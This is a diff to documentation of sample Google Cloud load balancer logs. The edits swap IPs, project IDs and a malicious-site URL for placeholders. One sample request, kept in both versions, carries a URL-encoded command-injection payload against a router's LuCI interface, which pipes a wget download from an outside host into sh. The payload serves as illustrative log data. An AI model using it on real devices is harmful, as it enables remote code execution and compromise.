@@ -15,7 +15,7 @@ In this section, you will find examples of raw logs as generated natively by the
             "remoteIp": "1.2.3.4:49194",
             "requestMethod": "GET",
             "requestSize": "201",
-            "requestUrl": "http://5.6.7.8:80/cgi-bin/luci/;stok=/locale?form=country&operation=write&country=$(id%3E%60wget+-O-+http%3A%2F%2F1.1.1.1%3A88%2Ft%7Csh%3B%60)",
+            "requestUrl": "http://example.com/cgi-bin/luci/;stok=/locale?form=country&operation=write&country=$(id%3E%60wget+-O-+http%3A%2F%2F1.1.1.1%3A88%2Ft%7Csh%3B%60)",
             "responseSize": "155",
             "status": 503,
             "userAgent": "Go-http-client/1.1"
@@ -36,7 +36,7 @@ In this section, you will find examples of raw logs as generated natively by the
             },
             "proxyStatus": "error=\"destination_unavailable\"; details=\"failed_to_pick_backend\""
         },
-        "logName": "projects/integration-gcloadbalancing/logs/loadbalancing.googleapis.com%2Fexternal_regional_requests",
+        "logName": "User1",
         "receiveTimestamp": "2024-08-26T15:30:31.15568806Z",
         "resource": {
             "labels": {
@@ -49,7 +49,7 @@ In this section, you will find examples of raw logs as generated natively by the
                 "forwarding_rule_name": "forwarding_rule-name",
                 "matched_url_path_rule": "UNMATCHED",
                 "network_name": "default",
-                "project_id": "integration-gcloadbalancing",
+                "project_id": "my-project",
                 "region": "europe-west9",
                 "target_proxy_name": "proxy-name",
                 "url_map_name": "url_map-name"
@@ -103,13 +103,13 @@ In this section, you will find examples of raw logs as generated natively by the
             },
             "statusDetails": "response_sent_by_backend"
         },
-        "logName": "projects/google-project/logs/requests",
+        "logName": "User1",
         "receiveTimestamp": "2024-02-20T15:03:01.755764847Z",
         "resource": {
             "labels": {
                 "backend_service_name": "google-project-backend-03",
                 "forwarding_rule_name": "google-project-ip-pub-03",
-                "project_id": "google-project",
+                "project_id": "my-project",
                 "target_proxy_name": "google-project-lb-03-target-proxy",
                 "url_map_name": "google-project-lb-03",
                 "zone": "global"
@@ -119,7 +119,7 @@ In this section, you will find examples of raw logs as generated natively by the
         "severity": "INFO",
         "spanId": "74f69181f79f8236",
         "timestamp": "2024-02-20T15:03:00.867759Z",
-        "trace": "projects/google-project/traces/ff592ffa0c72bac07e758a3851fd44f5"
+        "trace": "projects/my-project/traces/ff592ffa0c72bac07e758a3851fd44f5"
     }
     ```
 
@@ -150,7 +150,7 @@ In this section, you will find examples of raw logs as generated natively by the
         },
         "httpRequest": {
             "requestMethod": "GET",
-            "requestUrl": "http://malicious.site/url",
+            "requestUrl": "http://example.com/url",
             "requestSize": "488",
             "status": 403,
             "responseSize": "258",
@@ -162,7 +162,7 @@ In this section, you will find examples of raw logs as generated natively by the
             "type": "http_load_balancer",
             "labels": {
                 "target_proxy_name": "http-lb-proxy",
-                "project_id": "project_id",
+                "project_id": "my-project",
                 "zone": "global",
                 "url_map_name": "http-load-balancer",
                 "forwarding_rule_name": "http-content-rule",
@@ -172,7 +172,7 @@ In this section, you will find examples of raw logs as generated natively by the
         "timestamp": "2023-12-25T07:17:32.061039Z",
         "severity": "WARNING",
         "logName": "projects/project_id/logs/requests",
-        "trace": "projects/project_id/traces/15dc480f7c7879c404b6b33843099866",
+        "trace": "projects/my-project/traces/15dc480f7c7879c404b6b33843099866",
         "receiveTimestamp": "2023-12-25T07:17:33.457621996Z",
         "spanId": "25c549956d7c28e2"
     }
